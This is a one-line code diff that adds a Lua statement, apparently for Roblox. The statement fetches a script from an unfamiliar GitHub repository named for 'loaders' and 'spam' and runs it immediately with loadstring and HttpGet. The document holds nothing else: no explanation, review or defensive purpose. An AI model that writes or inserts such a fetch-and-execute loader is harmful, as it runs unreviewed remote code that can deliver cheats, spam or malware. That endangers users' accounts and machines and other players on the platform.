@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/rainy-valley-spam0-z0i2l4ougt9r90.lua"))()
